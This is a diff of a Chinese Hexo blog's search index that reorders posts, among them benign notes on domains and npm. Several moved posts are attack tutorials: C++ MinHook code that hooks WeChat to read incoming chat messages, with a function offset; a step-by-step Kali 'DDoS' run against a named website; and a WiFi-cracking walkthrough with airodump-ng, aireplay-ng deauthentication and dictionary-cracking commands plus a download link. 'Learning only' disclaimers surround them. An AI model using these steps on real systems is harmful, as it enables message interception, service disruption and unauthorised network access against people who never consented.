@@ -90,6 +90,31 @@
       </tags>
   </entry>
   <entry>
+    <title>HOOK微信获取聊天消息</title>
+    <url>/2022/09/21/HOOK%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E8%81%8A%E5%A4%A9%E6%B6%88%E6%81%AF/</url>
+    <content><![CDATA[<blockquote>
+<div class="wp-block-argon-admonition admonition shadow-sm" style="border-left-color:#660000"><div class="admonition-title" style="background-color:#dd0000"><span>警告</span></div><div class="admonition-body"><font color=red>网络不是法外之地，本篇文章仅供技术交流，相关具体实现过程我将省略！</font></div></div>
+</blockquote>
+<h2 id="获取微信处理消息的函数"><a href="#获取微信处理消息的函数" class="headerlink" title="获取微信处理消息的函数"></a>获取微信处理消息的函数</h2><p>我们可以反复向通过CE搜索消息，获取消息所在的内存地址，然后下硬件写入断点，在栈里找到相关函数，这里你可以自行按上面方法进行搜索。</p>
+<span id="more"></span>
+
+<h2 id="使用MinHook-hook该消息函数"><a href="#使用MinHook-hook该消息函数" class="headerlink" title="使用MinHook hook该消息函数"></a>使用MinHook hook该消息函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Initialize MinHook.</span><br><span class="line">if (MH_Initialize() != MH_OK)</span><br><span class="line">&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">DWORD windllAddress = (DWORD)GetModuleHandle(L&quot;WeChatWin.dll&quot;);</span><br><span class="line">if (windllAddress == 0) &#123;</span><br><span class="line">printf(&quot;Module Address Get Error: 0x%x\n&quot;, windllAddress);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">DWORD ReceiveHookAddress = windllAddress + 0x*****; // 偏移地址请查看下方</span><br><span class="line"> </span><br><span class="line">// Create a hook for MessageBoxW, in disabled state.</span><br><span class="line">if (MH_CreateHook((LPVOID)ReceiveHookAddress, &amp;ReceiveWxMessage,</span><br><span class="line">reinterpret_cast&lt;LPVOID*&gt;(&amp;_receiveMsgFunc)) != MH_OK)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;MH_CreateHook Error: 0x%x\n&quot;, ReceiveHookAddress);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="消息Hook函数"><a href="#消息Hook函数" class="headerlink" title="消息Hook函数"></a>消息Hook函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">void ReceiveWxMessage(DWORD r_eax)</span><br><span class="line">&#123;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">// 检查进程是否有权限访问指定的内存块</span><br><span class="line">if (IsBadReadPtr((void*)r_eax, 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgTypeOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgContentOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + WxidOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + GroupMsgSenderOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgSourceOffset), 4)</span><br><span class="line">) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">// 取出消息内容</span><br><span class="line">LPVOID pContent = *((LPVOID*)(r_eax + MsgContentOffset));</span><br><span class="line"> </span><br><span class="line">// 取出微信ID/群ID</span><br><span class="line">LPVOID pWxid = *((LPVOID*)(r_eax + WxidOffset));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if (!wcscmp((wchar_t*)pWxid, L&quot;filehelper&quot;)) &#123;</span><br><span class="line">wprintf(L&quot;Receive Msg\n Wechat ID: %ws \n Content: %ws\n&quot;, (wchar_t*)pWxid, (wchar_t*)pContent);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">catch (...)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugStringA(&quot;消息异常&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="Hook效果"><a href="#Hook效果" class="headerlink" title="Hook效果"></a>Hook效果</h2><p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210322614.png"></p>
+<blockquote>
+<p>接收函数具体地址：windllAddress + 0x1086F0;</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>微信</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hexo如何迁移到新电脑</title>
     <url>/2022/08/21/Hexo%E5%A6%82%E4%BD%95%E8%BF%81%E7%A7%BB%E5%88%B0%E6%96%B0%E7%94%B5%E8%84%91/</url>
     <content><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这是曾经发生的事情，自己对于数据备份疏忽，导致Hexo的<code>source</code>丢失，只能重新搭建博客。。。。。</p>
@@ -157,63 +182,6 @@
       </categories>
       <tags>
         <tag>技术</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HOOK微信获取聊天消息</title>
-    <url>/2022/09/21/HOOK%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E8%81%8A%E5%A4%A9%E6%B6%88%E6%81%AF/</url>
-    <content><![CDATA[<blockquote>
-<div class="wp-block-argon-admonition admonition shadow-sm" style="border-left-color:#660000"><div class="admonition-title" style="background-color:#dd0000"><span>警告</span></div><div class="admonition-body"><font color=red>网络不是法外之地，本篇文章仅供技术交流，相关具体实现过程我将省略！</font></div></div>
-</blockquote>
-<h2 id="获取微信处理消息的函数"><a href="#获取微信处理消息的函数" class="headerlink" title="获取微信处理消息的函数"></a>获取微信处理消息的函数</h2><p>我们可以反复向通过CE搜索消息，获取消息所在的内存地址，然后下硬件写入断点，在栈里找到相关函数，这里你可以自行按上面方法进行搜索。</p>
-<span id="more"></span>
-
-<h2 id="使用MinHook-hook该消息函数"><a href="#使用MinHook-hook该消息函数" class="headerlink" title="使用MinHook hook该消息函数"></a>使用MinHook hook该消息函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Initialize MinHook.</span><br><span class="line">if (MH_Initialize() != MH_OK)</span><br><span class="line">&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">DWORD windllAddress = (DWORD)GetModuleHandle(L&quot;WeChatWin.dll&quot;);</span><br><span class="line">if (windllAddress == 0) &#123;</span><br><span class="line">printf(&quot;Module Address Get Error: 0x%x\n&quot;, windllAddress);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">DWORD ReceiveHookAddress = windllAddress + 0x*****; // 偏移地址请查看下方</span><br><span class="line"> </span><br><span class="line">// Create a hook for MessageBoxW, in disabled state.</span><br><span class="line">if (MH_CreateHook((LPVOID)ReceiveHookAddress, &amp;ReceiveWxMessage,</span><br><span class="line">reinterpret_cast&lt;LPVOID*&gt;(&amp;_receiveMsgFunc)) != MH_OK)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;MH_CreateHook Error: 0x%x\n&quot;, ReceiveHookAddress);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h2 id="消息Hook函数"><a href="#消息Hook函数" class="headerlink" title="消息Hook函数"></a>消息Hook函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">void ReceiveWxMessage(DWORD r_eax)</span><br><span class="line">&#123;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">// 检查进程是否有权限访问指定的内存块</span><br><span class="line">if (IsBadReadPtr((void*)r_eax, 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgTypeOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgContentOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + WxidOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + GroupMsgSenderOffset), 4)</span><br><span class="line">|| IsBadReadPtr((void*)(r_eax + MsgSourceOffset), 4)</span><br><span class="line">) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">// 取出消息内容</span><br><span class="line">LPVOID pContent = *((LPVOID*)(r_eax + MsgContentOffset));</span><br><span class="line"> </span><br><span class="line">// 取出微信ID/群ID</span><br><span class="line">LPVOID pWxid = *((LPVOID*)(r_eax + WxidOffset));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if (!wcscmp((wchar_t*)pWxid, L&quot;filehelper&quot;)) &#123;</span><br><span class="line">wprintf(L&quot;Receive Msg\n Wechat ID: %ws \n Content: %ws\n&quot;, (wchar_t*)pWxid, (wchar_t*)pContent);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">catch (...)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugStringA(&quot;消息异常&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h2 id="Hook效果"><a href="#Hook效果" class="headerlink" title="Hook效果"></a>Hook效果</h2><p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210322614.png"></p>
-<blockquote>
-<p>接收函数具体地址：windllAddress + 0x1086F0;</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>微信</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kali的DDoS攻击方法</title>
-    <url>/2022/09/21/Kali%E7%9A%84DDoS%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212049992.jpeg"></p>
-<p><strong>本文章使用的是Kali Linux的2021-4-installer-amd64版本</strong> <strong>Kali Linux的安装过程本文章不做过多说明，请自行百度</strong> <strong>本帖子如果涉及侵权请联系我</strong>  </p>
-<span id="more"></span>
-
-<p>1**.**首先，打开一个终端然后<code>su root</code>进入<code>root</code></p>
-<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212050035.png" alt="img">  </p>
-<p>2.下载ddos文件包  </p>
-<p>自行百度下载</p>
-<p>3.cd到ddos包下</p>
-<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212050053.png" alt="img"> </p>
-<p> 4.用python执行<code>ddos.py</code>，输入命令：<code>python ddos.py</code></p>
-<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056870.png" alt="img">  </p>
-<p>5.再打开一个终端输入命令:<code> ping www.siediyer.cn</code>  即可获得攻击对象的IP地址。（获取IP后<code>Ctrl+C</code>可以结束<code>ping</code>）   <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212055245.png" alt="img">  </p>
-<p>6.然后回到刚刚的终端，输入<code>ping</code>到的IP地址：</p>
-<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056852.png" alt="img"></p>
-<p>  7.Attack Port即攻击端口，一般服务器默认为80（更多内容请百度）  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056029.png" alt="img"> </p>
-<p> 8.Attack Speed即攻击速度，数值越大越快，最大不能超过1000  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056295.png" alt="img">  </p>
-<p>9.按下回车，如果出现以下界面，即代表已经开始向该IP发起DDos攻击，也就成功了。  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056196.png" alt="img">   </p>
-<p>安全无边疆，努力习知识  </p>
-<p>本文章只供学习交流学习不可用于其他非法用途！！！</p>
-<p> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056473.png" alt="9"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>Kali</tag>
       </tags>
   </entry>
   <entry>
@@ -291,6 +259,38 @@
       </categories>
       <tags>
         <tag>技术</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kali的DDoS攻击方法</title>
+    <url>/2022/09/21/Kali%E7%9A%84DDoS%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212049992.jpeg"></p>
+<p><strong>本文章使用的是Kali Linux的2021-4-installer-amd64版本</strong> <strong>Kali Linux的安装过程本文章不做过多说明，请自行百度</strong> <strong>本帖子如果涉及侵权请联系我</strong>  </p>
+<span id="more"></span>
+
+<p>1**.**首先，打开一个终端然后<code>su root</code>进入<code>root</code></p>
+<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212050035.png" alt="img">  </p>
+<p>2.下载ddos文件包  </p>
+<p>自行百度下载</p>
+<p>3.cd到ddos包下</p>
+<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212050053.png" alt="img"> </p>
+<p> 4.用python执行<code>ddos.py</code>，输入命令：<code>python ddos.py</code></p>
+<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056870.png" alt="img">  </p>
+<p>5.再打开一个终端输入命令:<code> ping www.siediyer.cn</code>  即可获得攻击对象的IP地址。（获取IP后<code>Ctrl+C</code>可以结束<code>ping</code>）   <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212055245.png" alt="img">  </p>
+<p>6.然后回到刚刚的终端，输入<code>ping</code>到的IP地址：</p>
+<p>  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056852.png" alt="img"></p>
+<p>  7.Attack Port即攻击端口，一般服务器默认为80（更多内容请百度）  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056029.png" alt="img"> </p>
+<p> 8.Attack Speed即攻击速度，数值越大越快，最大不能超过1000  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056295.png" alt="img">  </p>
+<p>9.按下回车，如果出现以下界面，即代表已经开始向该IP发起DDos攻击，也就成功了。  <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056196.png" alt="img">   </p>
+<p>安全无边疆，努力习知识  </p>
+<p>本文章只供学习交流学习不可用于其他非法用途！！！</p>
+<p> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209212056473.png" alt="9"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
       </tags>
   </entry>
   <entry>
@@ -790,6 +790,33 @@
 ]]></content>
   </entry>
   <entry>
+    <title>hexo域名解析的两种方法</title>
+    <url>/2022/08/19/hexo%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想要在浏览器里面输入域名到达某个地址。必不可少的一步就是要告诉全世界的电脑，这个域名现在指向这个地方啦。<br>而这一步就是由 dns 服务器来负责的。<br>我们需要做的就是将域名与固定的 ip 地址绑定起来 (A)，或者是与某已有域名绑定起来（CNAME）.</p>
+<p>下面我们以阿里云购买的域名为例</p>
+<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><h3 id="方法一（不推荐）"><a href="#方法一（不推荐）" class="headerlink" title="方法一（不推荐）"></a>方法一（不推荐）</h3><p>首先获取自己 github 的二级域名的 IP 地址，win­dows 下直接在 cmd 里 Ping 一下自己的博客就会得到 IP 地址：</p>
+<span id="more"></span>
+
+<p><img src="https://movejian.github.io/images/20220819/cmd.png"></p>
+<p>我的 ip 是 185.199.111.153</p>
+<p>下面通过 DNS 域名解析将购买的域名指向 github 的二级域名：user­name.github.io，<br>进入阿里云的管理控制台 - 云解析 DNS，进入域名的解析设置，将得到的 IP 地址填到记录值一栏，点击确定就 OK 了。填完以后的解析列表会出现：</p>
+<p><img src="https://movejian.github.io/images/20220819/yumi.png"><br>记录值就是自己 github 的二级域名的 IP 地址。</p>
+<p>方法二（推荐）<br>直接解析域名的 CNAME 记录到你的 Git 二级域名，不要使用方法一中的 A 记录，因为 ip 地址可能会一段时间之后会改变 (由于网络地址转换协议 NAT)，所以建议记录类型选择 CNAME 进行解析，记录值填的就是 user­name.github.io，比如：</p>
+<p><img src="https://movejian.github.io/images/20220819/yumi2.png"></p>
+<p>如果你只用 github 的二级域名作为博客的地址，那么线路类型选择默认就可以了。</p>
+<h2 id="设置CNAME"><a href="#设置CNAME" class="headerlink" title="设置CNAME"></a>设置CNAME</h2><p>在 hexo 项目下，source 文件夹下面创建 CNAME 文件（没有后缀名的），在里面写上购买的域名。比如：<br>test­blog.top</p>
+<p><img src="https://movejian.github.io/images/20220819/CNAME.png"></p>
+<p>在 github 上面，打开 user­name.github.io 项目的（Set­tings）设置，然后在  Pages 选项,点击蓝色的按钮Add a domain 设置里填上购买的域名。比如：</p>
+<p><img src="https://movejian.github.io/images/20220819/domain.png"></p>
+<blockquote>
+<p>现在即可通过原二级域名和新域名访问hexo博客啦。</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>域名</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>npm安装卸载命令</title>
     <url>/2022/08/23/npm%E5%AE%89%E8%A3%85%E5%8D%B8%E8%BD%BD%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="npm安装模块"><a href="#npm安装模块" class="headerlink" title="npm安装模块"></a>npm安装模块</h2><p>利用 npm 安装xxx模块到当前命令行所在目录；</p>
@@ -860,33 +887,6 @@
       </categories>
       <tags>
         <tag>技术</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo域名解析的两种方法</title>
-    <url>/2022/08/19/hexo%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想要在浏览器里面输入域名到达某个地址。必不可少的一步就是要告诉全世界的电脑，这个域名现在指向这个地方啦。<br>而这一步就是由 dns 服务器来负责的。<br>我们需要做的就是将域名与固定的 ip 地址绑定起来 (A)，或者是与某已有域名绑定起来（CNAME）.</p>
-<p>下面我们以阿里云购买的域名为例</p>
-<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><h3 id="方法一（不推荐）"><a href="#方法一（不推荐）" class="headerlink" title="方法一（不推荐）"></a>方法一（不推荐）</h3><p>首先获取自己 github 的二级域名的 IP 地址，win­dows 下直接在 cmd 里 Ping 一下自己的博客就会得到 IP 地址：</p>
-<span id="more"></span>
-
-<p><img src="https://movejian.github.io/images/20220819/cmd.png"></p>
-<p>我的 ip 是 185.199.111.153</p>
-<p>下面通过 DNS 域名解析将购买的域名指向 github 的二级域名：user­name.github.io，<br>进入阿里云的管理控制台 - 云解析 DNS，进入域名的解析设置，将得到的 IP 地址填到记录值一栏，点击确定就 OK 了。填完以后的解析列表会出现：</p>
-<p><img src="https://movejian.github.io/images/20220819/yumi.png"><br>记录值就是自己 github 的二级域名的 IP 地址。</p>
-<p>方法二（推荐）<br>直接解析域名的 CNAME 记录到你的 Git 二级域名，不要使用方法一中的 A 记录，因为 ip 地址可能会一段时间之后会改变 (由于网络地址转换协议 NAT)，所以建议记录类型选择 CNAME 进行解析，记录值填的就是 user­name.github.io，比如：</p>
-<p><img src="https://movejian.github.io/images/20220819/yumi2.png"></p>
-<p>如果你只用 github 的二级域名作为博客的地址，那么线路类型选择默认就可以了。</p>
-<h2 id="设置CNAME"><a href="#设置CNAME" class="headerlink" title="设置CNAME"></a>设置CNAME</h2><p>在 hexo 项目下，source 文件夹下面创建 CNAME 文件（没有后缀名的），在里面写上购买的域名。比如：<br>test­blog.top</p>
-<p><img src="https://movejian.github.io/images/20220819/CNAME.png"></p>
-<p>在 github 上面，打开 user­name.github.io 项目的（Set­tings）设置，然后在  Pages 选项,点击蓝色的按钮Add a domain 设置里填上购买的域名。比如：</p>
-<p><img src="https://movejian.github.io/images/20220819/domain.png"></p>
-<blockquote>
-<p>现在即可通过原二级域名和新域名访问hexo博客啦。</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>域名</tag>
       </tags>
   </entry>
   <entry>
@@ -1280,65 +1280,6 @@
       </tags>
   </entry>
   <entry>
-    <title>实战kali破解wifi密码 全网最详细的保姆级教程</title>
-    <url>/2022/09/21/%E5%AE%9E%E6%88%98kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h2 id="kali官网"><a href="#kali官网" class="headerlink" title="kali官网"></a>kali官网</h2><hr>
-<p>kali是什么？<br> ——kali就是一个专门用于渗透行业的Linux发行版本，里面的工具非常丰富，本文就是建立在kali系统的支持之上的</p>
-<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
-<p>下载了vm文件后可以直接用VMware打开，开机后<br> <strong>用户名：kali<br> 密码：kali</strong></p>
-<span id="more"></span>
-
-<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="查看已安装网卡"><a href="#查看已安装网卡" class="headerlink" title="查看已安装网卡"></a>查看已安装网卡</h3><p>以下的操作都需要提升权限，默认的root密码都是kali</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">sudo su</span><br><span class="line">#查看网卡</span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210428371.png"><br> 如果没有，请注意是否开启了网卡在虚拟机的连接，如下图<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210430334.png"></p>
-<p>打开一个终端窗口</p>
-<h3 id="开启网卡监控"><a href="#开启网卡监控" class="headerlink" title="开启网卡监控"></a>开启网卡监控</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#开启网卡监控</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431501.png"><br> 可以使用命令看看网卡的名字是否改变</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431574.png"><br> 可以看到最后的那个名字已经改变</p>
-<h3 id="扫描wifi"><a href="#扫描wifi" class="headerlink" title="扫描wifi"></a>扫描wifi</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
-
-<p>我们选择这个名叫adcd的wifi进行破解<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431426.png"></p>
-<h3 id="等待抓取握手包"><a href="#等待抓取握手包" class="headerlink" title="等待抓取握手包"></a>等待抓取握手包</h3><p>上述方法后，按<code>ctrl+c</code>，退出扫描</p>
-<p>输入命令</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng -w freedom -c <span class="number">11</span> --bssid 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC wlan0mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>
-
-<p>-c：指定信道<br> -w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br> –bssid：指定路由器的MAC</p>
-<p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431403.png">]</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432076.png"><br> 回车后，如下界面<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432332.png"><br> 从这个界面可以看出，选定的wifi一共有一个人连接，没有人连接的wifi是无法破解的</p>
-<h3 id="爆破-抓取握手包"><a href="#爆破-抓取握手包" class="headerlink" title="爆破 抓取握手包"></a>爆破 抓取握手包</h3><p>这个步骤，说白了，就是将一个用户踢下线，让他重新连接WIFI，这样我们就能监听并且截取到握手包</p>
-<p>重启一个终端窗口，一样的，申请管理员权限，密码默认：kali</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
-
-<p>执行如下命令，同样的，需要输入上一步的两个参数，一个客户机的MAC，和路由器的MAC</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC -c A4:<span class="number">50</span>:<span class="number">46</span>:D8:<span class="number">74</span>:<span class="number">29</span> wlan0mon</span><br></pre></td></tr></table></figure>
-
-<p>-a：指定路由器的MAC<br> -c：指定客户机的MAC</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432483.png"><br> 执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解</p>
-<h3 id="抓取成功"><a href="#抓取成功" class="headerlink" title="抓取成功"></a>抓取成功</h3><p>当第四步的终端窗口出现如下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432057.png"><br> 表明成功抓取到握手包，进行下一个步骤<br> <strong>注意！！这里抓到包一定要按<code>ctrl+c</code>退出抓包，不然抓到的握手包用不了哦</strong></p>
-<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>包在<code>**/home/kali/**</code>文件夹下，找到名叫<code>freedom-01.ivs</code>文件，这个就是抓到的包</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432141.png"><br> 然后就是字典，我个人建议将字典一同放在该目录下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432350.png"><br> 然后再次重起一个终端窗口，输入如下命令</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ircrack-ng -w pass.txt freedom-*.ivs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432497.png"><br> 回车开始解密<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432365.png"><br> <strong>能否成功看字典的是否强大，也看脸</strong></p>
-<p>成功界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433429.png"><br> 失败界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433725.png"></p>
-<h2 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h2><hr>
-<p><strong>kali学的好，牢饭少不了<br> 本教程仅用于学习，请大家谨慎使用</strong></p>
-<p>需要的还是度盘自提吧：<br>链接：<a href="https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw">https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw</a><br>提取码：lbxk</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210436725.png"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>密码破解—Hashcat【RAR密码破解】</title>
     <url>/2022/11/21/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94Hashcat%E3%80%90RAR%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%91/</url>
     <content><![CDATA[<p>一、Hashcat简介<br>hashcat号称世界上最快的密码破解，世界上第一个唯一的基于GPU、CPU规则引擎，免费多GPU（高达128个GPU），多哈希，多操作系统（Linux和Windows本地二进制文件），多平台（OpenCL和CUDA支持），多算法，资源利用率低，基于字典攻击，支持分布式破解等等，hashcat目前支持各类公开算法高达247类，市面上面公开的密码加密算法基本都支持！</p>
@@ -1434,16 +1375,62 @@
       </tags>
   </entry>
   <entry>
-    <title>愿你编码半生，归来仍是少年</title>
-    <url>/2019/10/21/%E6%84%BF%E4%BD%A0%E7%BC%96%E7%A0%81%E5%8D%8A%E7%94%9F%EF%BC%8C%E5%BD%92%E6%9D%A5%E4%BB%8D%E6%98%AF%E5%B0%91%E5%B9%B4/</url>
-    <content><![CDATA[<h4 id="Hello-World-不巧，我也在等你。"><a href="#Hello-World-不巧，我也在等你。" class="headerlink" title="Hello,World.不巧，我也在等你。"></a>Hello,World.不巧，我也在等你。</h4><p>​      有人说自己被社会磨平了棱角，泯灭了心性，受生活所迫，“都说是为生活所迫，生活缺从来没有被抓过；都说被社会磨去棱角，社会之恶至今无法逃脱”，我们都有权利选择自己想成为的人，并不是由社会说了算，我们都曾年少，我们都曾有棱角，社会的熔炉却在不断的炼化我们，到底是磨平了棱角，还是磨成了钢刀，就让时间来见证吧！</p>
-<p>​      常年混迹于各大网络社区，也曾愤青，如今独爱云淡风轻，只愿在滚滚红尘中揽得风花雪月独醉。</p>
-<h4 id="感谢你的到来。"><a href="#感谢你的到来。" class="headerlink" title="感谢你的到来。"></a>感谢你的到来。</h4><span id="more"></span>
+    <title>实战kali破解wifi密码 全网最详细的保姆级教程</title>
+    <url>/2022/09/21/%E5%AE%9E%E6%88%98kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h2 id="kali官网"><a href="#kali官网" class="headerlink" title="kali官网"></a>kali官网</h2><hr>
